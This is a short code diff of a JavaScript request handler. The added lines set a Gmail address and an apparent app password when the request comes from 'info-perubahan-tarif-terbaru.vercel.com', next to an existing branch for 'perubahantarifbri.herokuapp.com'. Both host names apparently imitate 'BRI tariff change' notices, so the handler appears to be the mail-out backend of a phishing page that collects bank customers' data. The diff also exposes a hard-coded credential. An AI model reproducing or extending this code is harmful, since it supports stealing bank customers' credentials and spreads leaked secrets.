@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
         
+    if (url == 'info-perubahan-tarif-terbaru.vercel.com'){
+
+       email = 'ontokdwek@gmail.com'
+       pass = 'srhqptagidtwslo'
+    }else
+    
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
